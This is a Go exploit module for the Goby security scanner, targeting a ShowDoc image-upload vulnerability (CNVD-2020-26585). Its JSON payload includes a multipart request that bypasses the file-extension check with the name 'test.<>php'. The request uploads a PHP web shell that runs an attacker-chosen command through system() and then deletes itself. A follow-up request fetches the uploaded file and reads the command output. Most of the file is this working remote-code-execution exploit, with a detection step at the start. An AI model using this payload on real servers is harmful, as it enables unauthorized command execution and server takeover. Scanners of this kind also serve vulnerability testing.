package exploits

import (
	"gopoc"

	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Showdoc存在文件上传漏洞",
  "Description": "Showdoc存在文件上传漏洞，攻击者可以利用漏洞获取服务器权限。",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": "2021-06-23",
  "Author": "desktop-kf8vclk\\360\r\n",
  "GobyQuery": "app=\"ShowDoc\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "厂商暂未提供修复方案，请关注厂商网站及时更新:\n\n\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\thttps://www.showdoc.cc",
  "References": [
    "https://gobies.org/"
  ],
  "RealReferences": [
    "https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "-----------------------------346031065719027724703329952952\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"1.<>php\"\nContent-Type: text/plain\n\n<?php echo \"921378126371623762173617\";?>\n-----------------------------346031065719027724703329952952--",
        "data_type": "text",
        "follow_redirect": true,
        "method": "POST",
        "uri": "/index.php?s=/home/page/uploadImg",
        "header": {
          "Content-Type": "multipart/form-data; boundary=---------------------------346031065719027724703329952952"
        }
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": ",\"success\":1}",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "\\/Public\\/Uploads\\/",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "date|lastbody|regex|.*Uploads\\\\\\/(.*?)\\\\\\/.*",
        "file|lastbody|regex|.*Uploads\\\\\\/.*\\\\\\/(.*?)\\\""
      ]
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/Public/Uploads/{{{date}}}/{{{file}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "921378126371623762173617",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/index.php?s=/home/page/uploadImg",
        "follow_redirect": true,
        "header": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
          "Content-Length": "239",
          "Content-Type": "multipart/form-data; boundary=--------------------------921378126371623762173617",
          "Accept-Encoding": "gzip"
        },
        "data_type": "text",
        "data": "----------------------------921378126371623762173617\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>php\"\nContent-Type: text/plain\n\n<?php system(\"{{{cmd}}}\");unlink(__FILE__);?>\n----------------------------921378126371623762173617--"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "success",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "Public",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "Uploads",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "date|lastbody|regex|.*Uploads\\\\\\/(.*?)\\\\\\/.*",
        "file|lastbody|regex|.*Uploads\\\\\\/.*\\\\\\/(.*?)\\\"",
        "output|lastbody"
      ]
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/Public/Uploads/{{{date}}}/{{{file}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": null,
  "CVEIDs": null,
  "CVSSScore": "",
  "CNVDIDs": [
    "CNVD-2020-26585"
  ],
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Disable": false,
  "Recommandation": ""
}`

	gopoc.ExpManager.AddExploit(gopoc.NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

// generate by genpoc: goby-cmd -mode genpoc -CNVDID CNVD-2020-26585 -exportFile exploits\user\CNVD-export.go
